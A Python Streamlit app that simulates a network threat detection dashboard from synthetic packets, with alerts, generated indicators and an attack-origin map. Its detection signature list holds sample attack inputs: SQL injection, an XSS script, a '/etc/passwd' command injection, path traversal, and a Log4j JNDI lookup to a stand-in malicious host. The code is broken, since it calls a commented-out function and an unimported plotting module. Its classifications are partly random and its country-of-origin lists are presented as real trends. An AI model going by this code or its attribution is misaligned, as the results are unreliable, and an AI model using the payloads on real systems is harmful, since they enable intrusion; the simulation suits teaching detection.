import random
import streamlit as st
import pandas as pd
import numpy as np
import time
import threading
import queue
from collections import deque
# import plotly.graph_objects as go
import plotly.express as px
from datetime import datetime
import logging
# Logging setup
logging.basicConfig(filename='threat_log.log', level=logging.INFO,
                    format='%(asctime)s:%(levelname)s:%(message)s')

# Streamlit configuration
st.set_page_config(
    page_title="Cyber Threat Detection",
    page_icon="🛡️",
    layout="wide"
)

# Apply minimal CSS for better readability
st.markdown("""
<style>
    .highlight {
        background-color: #FF4B4B;
        padding: 0.2rem 0.5rem;
        border-radius: 0.3rem;
        color: white;
    }
    .safe {
        background-color: #4CAF50;
        padding: 0.2rem 0.5rem;
        border-radius: 0.3rem;
        color: white;
    }
</style>
""", unsafe_allow_html=True)

# Queues and global variables
packet_queue = queue.Queue(maxsize=100)
processed_data_queue = queue.Queue(maxsize=20)
traffic_history = deque(maxlen=200)
threat_counts = {'Benign': 0, 'DDoS': 0, 'PortScan': 0, 'Malware': 0, 'Phishing': 0}
alert_log = deque(maxlen=50)
latest_processed_df = pd.DataFrame()
geolocation_data = {}

# Real-world attack patterns
ATTACK_PATTERNS = {
    'DDoS': {
        'packet_size_range': (40, 100),  # Smaller packets in floods
        'ports': [80, 443, 53],  # Web and DNS servers
        'protocol_preference': [17, 6],  # UDP, TCP
        'origin_countries': ['Russia', 'China', 'North Korea', 'Ukraine', 'Brazil'],
        'patterns': [
            {'description': 'SYN Flood', 'tcp_flags': 0x02, 'packet_rate': 'high'},
            {'description': 'UDP Flood', 'protocol_type': 17, 'packet_rate': 'very high'},
            {'description': 'ICMP Flood', 'protocol_type': 1, 'packet_rate': 'high'},
        ]
    },
    'PortScan': {
        'packet_size_range': (40, 60),  # Minimal packet size
        'ports': list(range(1, 1024)) + [3306, 3389, 8080, 8443],  # Common ports to scan
        'protocol_preference': [6],  # TCP mostly
        'origin_countries': ['Russia', 'China', 'North Korea', 'United States', 'Netherlands'],
        'patterns': [
            {'description': 'Sequential Scan', 'port_pattern': 'sequential'},
            {'description': 'SYN Scan', 'tcp_flags': 0x02, 'packet_rate': 'medium'},
        ]
    },
    'Malware': {
        'packet_size_range': (100, 1500),  # Variable sizes
        'ports': [4444, 6666, 1337, 31337, 9001],  # Common C2 channels
        'protocol_preference': [6, 17],  # TCP and UDP
        'origin_countries': ['Russia', 'China', 'Iran', 'North Korea', 'Vietnam'],
        'patterns': [
            {'description': 'Command & Control', 'dest_port': 4444},
            {'description': 'Data Exfiltration', 'packet_size': 'large', 'frequency': 'periodic'},
        ]
    },
    'Phishing': {
        'packet_size_range': (500, 1500),  # Larger packets (web content)
        'ports': [80, 443, 25],  # Web and email
        'protocol_preference': [6],  # TCP
        'origin_countries': ['Nigeria', 'Russia', 'China', 'Brazil', 'Romania'],
        'patterns': [
            {'description': 'Email Delivery', 'dest_port': 25},
            {'description': 'Fake Website', 'dest_port': 80},
        ]
    }
}

# Example suspicious domains for phishing
SUSPICIOUS_DOMAINS = [
    'amaz0n-security.com', 'paypa1-verify.net', 'g00gle-verify.com',
    'bank0famerica-secure.com', 'netflix-billing.info', 'microsoft-update.info',
    'apple-id-confirm.com', 'secure-ebay-login.com', 'instagram-verify.net'
]

# Common exploit attempts
EXPLOIT_ATTEMPTS = [
    {'name': 'SQL Injection', 'pattern': 'SELECT * FROM users WHERE id=\'-1\' OR \'1\'=\'1\''},
    {'name': 'XSS Attack', 'pattern': '<script>alert("XSS")</script>'},
    {'name': 'Command Injection', 'pattern': '| cat /etc/passwd'},
    {'name': 'Path Traversal', 'pattern': '../../../etc/passwd'},
    {'name': 'Log4j', 'pattern': '${jndi:ldap://malicious-server.com/exploit}'}
]


# # Generate simulated countries for source IPs
# def get_country_for_ip(ip):
#     countries = ['United States', 'Russia', 'China', 'North Korea', 'Iran',
#                  'Brazil', 'India', 'Germany', 'United Kingdom', 'Nigeria']
#
#     # If IP starts with 185 or 95, more likely to be Russia
#     first_octet = int(ip.split('.')[0])
#     if first_octet in [95, 185]:
#         return np.random.choice(['Russia', 'Ukraine', 'Belarus'], p=[0.7, 0.2, 0.1])
#     elif first_octet in [112, 114]:
#         return np.random.choice(['China', 'North Korea'], p=[0.8, 0.2])
#     elif first_octet in [5, 31]:
#         return np.random.choice(['Iran', 'Syria'], p=[0.8, 0.2])
#     else:
#         # Otherwise choose based on IP modulo
#         index = first_octet % len(countries)
#         return countries[index]


# Generate synthetic packet for simulation
def generate_network_packet(attack_probability):
    # Determine if this will be an attack based on probability
    is_attack = np.random.random() < attack_probability

    # Base packet data
    packet = {
        'packet_length': np.random.randint(40, 1500),
        'protocol_type': np.random.choice([6, 17, 1]),  # TCP, UDP, ICMP
        'source_port': np.random.randint(1024, 65535),
        'ttl': np.random.randint(32, 128),
        'src_ip_1': np.random.randint(1, 255),
        'src_ip_2': np.random.randint(0, 255),
        'dst_ip_1': np.random.randint(1, 255),
        'dst_ip_2': np.random.randint(0, 255),
        'timestamp': time.time()
    }

    # If attack, modify packet characteristics based on attack type
    if is_attack:
        attack_type = np.random.choice(['DDoS', 'PortScan', 'Malware', 'Phishing'])
        attack_profile = ATTACK_PATTERNS[attack_type]

        # Set packet properties based on attack profile
        packet['packet_length'] = np.random.randint(*attack_profile['packet_size_range'])
        packet['dest_port'] = np.random.choice(attack_profile['ports'])
        packet['protocol_type'] = np.random.choice(attack_profile['protocol_preference'])

        # Set source IP to likely originate from known attack sources
        if np.random.random() < 0.7:  # 70% chance to come from suspicious country
            first_octet = np.random.choice([95, 185, 112, 114, 5, 31])
            packet['src_ip_1'] = first_octet

        # Add attack specifics based on type
        if attack_type == 'DDoS':
            packet['payload'] = "Flood data"

        elif attack_type == 'PortScan':
            # Sequential port scan simulation
            if np.random.random() < 0.5:
                packet['dest_port'] = np.random.randint(1, 1024)  # Scan low ports

        elif attack_type == 'Malware':
            # Add suspicious payload for C2 communication
            packet['payload'] = f"POST /gate.php HTTP/1.1"

        elif attack_type == 'Phishing':
            # Phishing typically includes malicious URLs or domains
            packet['payload'] = f"GET /login.html HTTP/1.1\nHost: {np.random.choice(SUSPICIOUS_DOMAINS)}"
    else:
        # Normal traffic
        packet['dest_port'] = np.random.choice([80, 443, 22, 53, 8080, np.random.randint(1024, 65535)])
        packet['payload'] = "Regular traffic data"

    return packet


# Packet capture thread - simulates network capture
def capture_packets(stop_event, attack_probability):
    while not stop_event.is_set():
        time.sleep(0.05)  # 20 packets per second
        packet = generate_network_packet(attack_probability)
        try:
            packet_queue.put(packet, block=False)
        except queue.Full:
            pass  # Skip if queue is full


# Processing thread - aggregate and analyze packets
def process_packets(stop_event):
    global latest_processed_df, traffic_history, threat_counts, geolocation_data
    window_size = 10  # Process in small batches
    window = []

    while not stop_event.is_set():
        # Collect packets for the current window
        try:
            packet_data = packet_queue.get(timeout=0.5)
            window.append(packet_data)

            # When window is full, process the batch
            if len(window) >= window_size:
                df = pd.DataFrame(window)

                # Process the batch and make predictions (simulated)
                try:
                    # Make simulated predictions
                    # Higher probability of benign to make it more realistic
                    predicted_classes = []

                    for _, packet in df.iterrows():
                        # Check if this looks like an attack based on attack patterns
                        if 'payload' in packet:
                            payload = packet['payload']
                            # Check for attack signatures in payload
                            if any(exploit['pattern'] in str(payload) for exploit in EXPLOIT_ATTEMPTS):
                                predicted_classes.append(np.random.choice(['Malware', 'Phishing']))
                                continue

                        # Check port patterns
                        if 'dest_port' in packet:
                            if packet['dest_port'] in [4444, 6666, 1337, 31337]:
                                predicted_classes.append('Malware')
                                continue
                            elif packet['protocol_type'] == 6 and packet['dest_port'] < 25:
                                predicted_classes.append('PortScan')
                                continue
                            elif packet['dest_port'] == 80 and packet['packet_length'] < 60:
                                predicted_classes.append('DDoS')
                                continue

                        # Default to benign with 80% probability if no attack detected
                        predicted_classes.append(np.random.choice(
                            ['Benign', 'DDoS', 'PortScan', 'Malware', 'Phishing'],
                            p=[0.8, 0.05, 0.05, 0.05, 0.05]
                        ))

                    # Add predictions to the dataframe
                    df['prediction'] = predicted_classes

                    # Create source and destination IP addresses for display
                    df['source'] = df['src_ip_1'].astype(str) + '.' + df['src_ip_2'].astype(str) + '.x.x'
                    df['destination'] = df['dst_ip_1'].astype(str) + '.' + df['dst_ip_2'].astype(str) + '.x.x'

                    # Add country data for visualization
                    for idx, row in df.iterrows():
                        source_ip = row['source']
                        if source_ip not in geolocation_data:
                            geolocation_data[source_ip] = get_country_for_ip(source_ip)

                    # Update threat statistics
                    for label in predicted_classes:
                        if label in threat_counts:
                            threat_counts[label] += 1

                    # Add alerts for threats
                    for i, label in enumerate(predicted_classes):
                        if label != 'Benign':
                            source_ip = df.iloc[i]['source']
                            dest_port = int(df.iloc[i]['dest_port']) if 'dest_port' in df.iloc[i] else 0
                            country = geolocation_data.get(source_ip, "Unknown")

                            # Generate a realistic alert with example data
                            alert_details = ""
                            if label == 'DDoS':
                                alert_details = f"High volume of {packet['protocol_type']} traffic to port {dest_port}"
                            elif label == 'PortScan':
                                alert_details = f"Sequential port scanning detected from {source_ip}"
                            elif label == 'Malware':
                                alert_details = f"Suspicious C2 communication to {dest_port}"
                            elif label == 'Phishing':
                                alert_details = f"Connection to known phishing domain"

                            alert = {
                                'timestamp': time.strftime('%H:%M:%S'),
                                'threat_type': label,
                                'source_ip': source_ip,
                                'country': country,
                                'dest_port': dest_port,
                                'details': alert_details
                            }
                            alert_log.append(alert)
                            logging.warning(f"Alert: {label} detected from {source_ip}:{dest_port} - {alert_details}")

                    # Add processed data to the history
                    for _, row in df.iterrows():
                        traffic_point = {
                            'timestamp': row['timestamp'],
                            'packet_length': row['packet_length'],
                            'protocol': row.get('protocol_type', 0),
                            'prediction': row['prediction'],
                            'source': row['source'],
                            'dest_port': row.get('dest_port', 0)
                        }
                        traffic_history.append(traffic_point)

                    # Save the latest processed dataframe
                    latest_processed_df = df

                    # Add to processed queue for display
                    try:
                        processed_data_queue.put(df, block=False)
                    except queue.Full:
                        pass  # Skip if queue is full

                except Exception as e:
                    logging.error(f"Processing error: {str(e)}")

                # Clear the window for next batch
                window = []

        except queue.Empty:
            # If no packets for 0.5 second, process partial window
            if window:
                window = []
            time.sleep(0.1)  # Prevent CPU spin


# Initialize session state for UI controls
def init_session_state():
    if 'monitoring' not in st.session_state:
        st.session_state.monitoring = False
    if 'attack_probability' not in st.session_state:
        st.session_state.attack_probability = 0.3
    if 'auto_refresh' not in st.session_state:
        st.session_state.auto_refresh = True
    if 'refresh_interval' not in st.session_state:
        st.session_state.refresh_interval = 2


# Main application
def main():
    st.title("🛡️ Cyber Threat Detection System")
    st.markdown("""
    This application demonstrates real-time cyber threat detection and monitoring capabilities.
    It simulates network traffic and analyzes it for potential security threats.

    **Example Use Cases:**
    - Real-time monitoring of network activity
    - Detection of common cyber attacks (DDoS, Port Scanning, Malware, Phishing)
    - Geographic visualization of attack origins
    - Alert generation and incident response

    *Note: This is a simulation using synthetic data that represents real-world attack patterns.*
    """)

    # Initialize session state
    init_session_state()

    # Sidebar controls
    with st.sidebar:
        st.header("🛠️ Controls")

        # Start/Stop buttons
        start_col, stop_col = st.columns(2)
        with start_col:
            start_button = st.button("Start Monitoring", key="start", use_container_width=True)
        with stop_col:
            stop_button = st.button("Stop Monitoring", key="stop", use_container_width=True)

        # Status indicator
        status_placeholder = st.empty()
        if st.session_state.monitoring:
            status_placeholder.success("Monitoring is ACTIVE")
        else:
            status_placeholder.warning("Monitoring is INACTIVE")

        # Attack simulation rate
        attack_prob = st.slider(
            "Attack Simulation Rate",
            min_value=0.0,
            max_value=1.0,
            value=st.session_state.attack_probability,
            step=0.05,
            help="Controls how frequently attacks appear in the simulation"
        )
        st.session_state.attack_probability = attack_prob

        # Auto-refresh settings
        st.checkbox("Auto-refresh", value=st.session_state.auto_refresh, key="auto_refresh")
        refresh_interval = st.slider(
            "Refresh interval (seconds)",
            min_value=1,
            max_value=10,
            value=st.session_state.refresh_interval,
            step=1
        )
        st.session_state.refresh_interval = refresh_interval

        st.divider()

        # Statistics
        st.subheader("Statistics")
        total_packets = sum(threat_counts.values())
        st.metric("Total Packets Analyzed", total_packets)

        threat_rate = 0
        if total_packets > 0:
            threat_rate = sum(v for k, v in threat_counts.items() if k != 'Benign') / total_packets
        st.metric("Threat Detection Rate", f"{threat_rate:.2%}")

    # Example data explainer
    with st.expander("About the Example Data"):
        st.markdown("""
        ### Example Data in This Demo

        This simulation uses realistic patterns from actual cyber threats:

        1. **DDoS Attacks**
           - Small packet sizes (40-100 bytes)
           - High packet rates to overwhelm services
           - Targets common ports (80, 443, 53)
           - Often from countries with lax cybercrime laws

        2. **Port Scanning**
           - Very small packet sizes (40-60 bytes)
           - Sequential or random port probing
           - Typically targets well-known service ports
           - Often precedes more serious attacks

        3. **Malware Communication**
           - Command & Control (C2) traffic
           - Communication on unusual ports (4444, 6666, 1337)
           - Data exfiltration patterns
           - Traffic to known malicious domains

        4. **Phishing**
           - Connection to suspicious domains
           - Fake login pages with domain names that mimic legitimate services
           - Email-related traffic on port 25

        The geographic display shows common origins for different attack types based on real-world trends.
        """)

    # Start/Stop Threading Logic
    if start_button and not st.session_state.monitoring:
        st.session_state.monitoring = True
        st.session_state.stop_event = threading.Event()

        # Reset data for new session
        traffic_history.clear()
        for k in threat_counts:
            threat_counts[k] = 0
        alert_log.clear()
        geolocation_data.clear()

        # Clear queues
        while not packet_queue.empty():
            try:
                packet_queue.get_nowait()
            except queue.Empty:
                break
        while not processed_data_queue.empty():
            try:
                processed_data_queue.get_nowait()
            except queue.Empty:
                break

        # Create and start threads
        capture_thread = threading.Thread(
            target=capture_packets,
            args=(st.session_state.stop_event, st.session_state.attack_probability),
            daemon=True
        )

        processing_thread = threading.Thread(
            target=process_packets,
            args=(st.session_state.stop_event,),
            daemon=True
        )

        capture_thread.start()
        processing_thread.start()
        st.session_state.threads = (capture_thread, processing_thread)
        st.success("Monitoring started!")

    if stop_button and st.session_state.monitoring:
        if 'stop_event' in st.session_state:
            st.session_state.stop_event.set()
            time.sleep(0.5)  # Give threads time to shut down
            st.session_state.pop('threads', None)
            st.session_state.pop('stop_event', None)
            st.session_state.monitoring = False
            st.warning("Monitoring stopped.")

    # Create layout with tabs
    tab1, tab2, tab3 = st.tabs(["📡 Live Monitoring", "📊 Threat Analysis", "🚨 Alerts"])

    # Tab 1: Live Monitoring
    with tab1:
        # Create placeholders for updating
        dashboard_metrics = st.container()
        traffic_chart = st.empty()
        recent_packets = st.empty()

        with dashboard_metrics:
            # Display metrics in columns
            col1, col2, col3 = st.columns(3)

            with col1:
                benign_count = threat_counts.get('Benign', 0)
                total_count = max(1, sum(threat_counts.values()))
                benign_pct = benign_count / total_count * 100
                st.metric("Benign Traffic", benign_count, f"{benign_pct:.1f}%")

            with col2:
                attack_count = sum(v for k, v in threat_counts.items() if k != 'Benign')
                attack_pct = attack_count / total_count * 100
                st.metric("Attack Traffic", attack_count, f"{attack_pct:.1f}%")

            with col3:
                # Gauge chart for threat level
                threat_level = attack_pct
                if threat_level > 50:
                    status = "⚠️ HIGH ALERT"
                    color = "red"
                elif threat_level > 20:
                    status = "⚠️ MEDIUM ALERT"
                    color = "orange"
                else:
                    status = "✓ NORMAL"
                    color = "green"

                st.write(f"**Threat Level**: {status}")

                fig = go.Figure(go.Indicator(
                    mode="gauge+number",
                    value=threat_level,
                    domain={'x': [0, 1], 'y': [0, 1]},
                    gauge={
                        'axis': {'range': [None, 100]},
                        'bar': {'color': color},
                        'steps': [
                            {'range': [0, 20], 'color': "lightgreen"},
                            {'range': [20, 50], 'color': "orange"},
                            {'range': [50, 100], 'color': "red"}
                        ]
                    }
                ))

                fig.update_layout(height=140, margin=dict(l=0, r=0, t=0, b=0))
                st.plotly_chart(fig, use_container_width=True)

        # Display traffic chart
        if traffic_history:
            # Extract the most recent data (last 100 entries)
            recent_history = list(traffic_history)[-100:]

            # Create plot data
            times = list(range(len(recent_history)))  # Use indices for x-axis
            packets = [item['packet_length'] for item in recent_history]
            predictions = [item['prediction'] for item in recent_history]

            # Set colors based on prediction
            colors = []
            for pred in predictions:
                if pred == 'Benign':
                    colors.append('green')
                elif pred == 'DDoS':
                    colors.append('red')
                elif pred == 'PortScan':
                    colors.append('orange')
                elif pred == 'Malware':
                    colors.append('purple')
                else:
                    colors.append('blue')

            fig = go.Figure()
            fig.add_trace(go.Scatter(
                x=times,
                y=packets,
                mode='lines+markers',
                marker=dict(color=colors, size=8),
                name='Packet Size',
                hovertemplate='Size: %{y} bytes<br>Type: %{text}',
                text=predictions
            ))

            fig.update_layout(
                title="Real-time Network Traffic",
                xaxis_title="Time",
                yaxis_title="Packet Size (bytes)",
                height=300,
                margin=dict(l=0, r=0, t=40, b=0)
            )

            traffic_chart.plotly_chart(fig, use_container_width=True)
        else:
            traffic_chart.info("No traffic data available yet. Start monitoring to collect data.")

        # Display recent packets
        with recent_packets.container():
            st.subheader("Real-time Network Activity")

            # If monitoring is active, try to get latest data
            if st.session_state.monitoring:
                try:
                    latest_data = None
                    # Try to get data from the queue without blocking
                    try:
                        latest_data = processed_data_queue.get(block=False)
                    except queue.Empty:
                        pass

                    # If we got new data or have existing data, display it
                    if latest_data is not None or not latest_processed_df.empty:
                        df_display = latest_data if latest_data is not None else latest_processed_df

                        # Select columns for display
                        columns_to_show = ['source', 'destination', 'dest_port', 'protocol_type', 'packet_length',
                                           'prediction']
                        columns_to_show = [c for c in columns_to_show if c in df_display.columns]

                        # Display data
                        st.dataframe(
                            df_display[columns_to_show].tail(10),
                            use_container_width=True,
                            hide_index=True
                        )
                    else:
                        st.info("Waiting for packet data...")
                except Exception as e:
                    st.error(f"Error displaying data: {str(e)}")
            else:
                st.info("Start monitoring to see real-time traffic data.")

    # Tab 2: Threat Analysis
    with tab2:
        st.subheader("Threat Distribution")

        # Threat distribution pie chart
        if sum(threat_counts.values()) > 0:
            labels = list(threat_counts.keys())
            values = list(threat_counts.values())

            chart_col, detail_col = st.columns([3, 2])

            with chart_col:
                fig = px.pie(
                    names=labels,
                    values=values,
                    title="Threat Distribution by Type",
                    color=labels,
                    color_discrete_map={
                        'Benign': 'green',
                        'DDoS': 'red',
                        'PortScan': 'orange',
                        'Malware': 'purple',
                        'Phishing': 'blue'
                    }
                )

                fig.update_layout(height=350)
                st.plotly_chart(fig, use_container_width=True)

            with detail_col:
                # Create a dataframe for better display
                threat_df = pd.DataFrame({
                    'Threat Type': labels,
                    'Count': values,
                    'Percentage': [f"{v / max(1, sum(values)) * 100:.1f}%" for v in values]
                })

                st.dataframe(threat_df, use_container_width=True, hide_index=True)

                # Add a bar chart for protocol distribution
                if traffic_history:
                    protocol_counts = {}
                    for item in traffic_history:
                        protocol = item['protocol']
                        if protocol not in protocol_counts:
                            protocol_counts[protocol] = 0
                        protocol_counts[protocol] += 1

                    # Convert protocol numbers to names
                    protocol_names = {}
                    for protocol in protocol_counts.keys():
                        if protocol == 6:
                            protocol_names["TCP"] = protocol_counts[protocol]
                        elif protocol == 17:
                            protocol_names["UDP"] = protocol_counts[protocol]
                        elif protocol == 1:
                            protocol_names["ICMP"] = protocol_counts[protocol]
                        else:
                            protocol_names[f"Other ({protocol})"] = protocol_counts[protocol]

                    st.subheader("Protocol Distribution")
                    fig = px.bar(
                        x=list(protocol_names.keys()),
                        y=list(protocol_names.values()),
                        labels={'x': 'Protocol', 'y': 'Count'}
                    )
                    fig.update_layout(height=200)
                    st.plotly_chart(fig, use_container_width=True)
        else:
            st.info("No threat data collected yet. Start monitoring to collect data.")

        # Display attack origin map if we have data
        if alert_log:
            st.subheader("Attack Origin Map")

            # Count attacks by country
            country_attacks = {}
            for alert in alert_log:
                country = alert.get('country', 'Unknown')
                if country not in country_attacks:
                    country_attacks[country] = 0
                country_attacks[country] += 1

            # Create dataframe for choropleth
            country_df = pd.DataFrame({
                'country': list(country_attacks.keys()),
                'attacks': list(country_attacks.values())
            })

            # Create choropleth map
            fig = px.choropleth(
                country_df,
                locations='country',
                locationmode='country names',
                color='attacks',
                hover_name='country',
                color_continuous_scale='Reds',
                title='Attack Origins by Country'
            )

            fig.update_layout(height=400)
            st.plotly_chart(fig, use_container_width=True)

    # Tab 3: Alerts
    with tab3:
        st.subheader("Recent Security Alerts")

        # Display alerts from alert_log
        if alert_log:
            # Convert alert_log to a DataFrame
            alert_df = pd.DataFrame(list(alert_log))

            # Display alerts with details column
            columns_to_show = ['timestamp', 'threat_type', 'source_ip', 'country', 'dest_port', 'details']
            columns_to_show = [c for c in columns_to_show if c in alert_df.columns]

            st.dataframe(
                alert_df[columns_to_show],
                use_container_width=True,
                hide_index=True
            )

            # Show threat indicators table
            st.subheader("Threat Indicators (IOCs)")

            # Create simulated IOCs from alerts
            ioc_data = []

            for alert in list(alert_log)[-10:]:  # Take most recent 10 alerts
                source_ip = alert['source_ip']
                threat_type = alert['threat_type']

                # Generate different IOC types based on threat
                if threat_type == 'DDoS':
                    ioc_type = 'IP Address'
                    value = source_ip
                    context = "Source of DDoS attack targeting critical services"
                elif threat_type == 'PortScan':
                    ioc_type = 'IP Address'
                    value = source_ip
                    context = "Reconnaissance activity, scanning for vulnerable services"
                elif threat_type == 'Malware':
                    if random.random() < 0.6:
                        ioc_type = 'Hash'
                        value = ''.join(np.random.choice(list('0123456789abcdef'), size=32))
                        context = "Malicious executable detected in network traffic"
                    else:
                        ioc_type = 'Domain'
                        value = f"c2-{random.randint(100, 999)}.evil-domain.com"
                        context = "Command & Control server communication"
                else:  # Phishing
                    ioc_type = 'Domain'
                    value = np.random.choice(SUSPICIOUS_DOMAINS)
                    context = "Hosts phishing page mimicking legitimate service"

                # Create IOC entry
                ioc_data.append({
                    'Type': ioc_type,
                    'Value': value,
                    'Associated Threat': threat_type,
                    'Confidence': np.random.choice(['Low', 'Medium', 'High']),
                    'First Seen': alert['timestamp'],
                    'Context': context
                })

            # Display as dataframe
            if ioc_data:
                ioc_df = pd.DataFrame(ioc_data)
                st.dataframe(ioc_df, use_container_width=True, hide_index=True)
        else:
            st.info("No alerts detected yet. Start monitoring to detect threats.")

        # Display system logs
        st.subheader("System Logs")
        try:
            with open("threat_log.log", "r") as log_file:
                logs = log_file.readlines()[-15:]  # Last 15 log entries
            st.code("".join(logs))
        except FileNotFoundError:
            st.warning("No log file found. Log file will be created when alerts are detected.")

    # Add auto-refresh capability
    if st.session_state.auto_refresh and st.session_state.monitoring:
        time.sleep(st.session_state.refresh_interval)
        st.rerun()


if __name__ == "__main__":
    main()
